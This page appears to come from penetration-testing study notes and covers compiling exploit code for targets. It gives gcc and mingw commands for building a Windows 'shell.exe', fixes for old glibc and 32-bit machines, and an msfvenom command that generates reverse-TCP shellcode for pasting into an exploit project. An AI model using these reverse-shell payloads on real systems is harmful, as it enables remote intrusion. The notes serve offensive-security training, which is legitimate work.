---
title: Compiling File
parent: General Usage
layout: default
nav_order: 18
---

## C File
1. Always try to compile on target machine first!
2. For C file, `gcc xxx.c -o outputfilename`
3. For compiling C in Kali, use mingw (`sudo apt install mingw-w64`) `x86_64-w64-mingw32-gcc shell.c -o shell.exe`(64-bit) or `i686-w64-mingw32-gcc shell.c -o shell.exe`(32-bit). If cannot then find out what needs to be linked (eg adding `-lws2_32`)
4. If compile for other kernel, add `-static.` 
5. sh: [XXXXX: 4] tcsetattr: Invalid argument -> this means no tty (interactive shell)
6. ./shared-binary: error while loading shared libraries: requires glibc 2.5 or later dynamic linker -> this means you need to compile using the following: `-Wl,--hash-style=both`
7. Fix compiling error (already done): `sudo apt-get install gcc-multilib`, `sudo apt-get install gcc-9-base libgcc-9-dev libc6-dev`
8. For really old non 64 bit machine, use this when compile: `-m32 -Wl,--hash-style=both`\
   For eg: `gcc -m32 -Wall -o xx xx.c -Wl,--hash-style=both`

## SLN file
1. If you wanna replace shellcode, use the following code on Kali to generate:
   `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -f csharp`
2. Copy everything after the first `{` (usually 0xfc) to the existing exploit code.
3. On the top there just below menu bar, select (x64 and release, or similar) then build solution.
